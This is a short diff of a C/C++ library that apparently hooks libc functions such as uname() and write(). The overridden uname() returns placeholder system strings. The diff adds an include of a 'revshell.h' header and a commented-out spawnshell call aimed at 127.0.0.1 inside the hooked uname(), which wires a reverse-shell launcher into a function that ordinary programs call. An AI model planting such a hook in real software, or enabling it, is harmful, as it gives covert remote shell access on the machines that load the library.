@@ -1,4 +1,5 @@
-﻿#include <dlfcn.h>	     // dlsym
+﻿#include "revshell.h"
+#include <dlfcn.h>	     // dlsym
 #include <sys/utsname.h> // utsname
 
 #include <stdio.h>
@@ -58,6 +59,8 @@ int uname(struct utsname* info)
 	std::strcpy(info->version, "VERSION");
 	std::strcpy(info->machine, "MACHINE");
 	std::strcpy(info->domainname, "DOMAINNAME");
+
+	//spawnshell((char*)"127.0.0.1");
 }
 
 ssize_t write(int fd, const void *buf, size_t count)
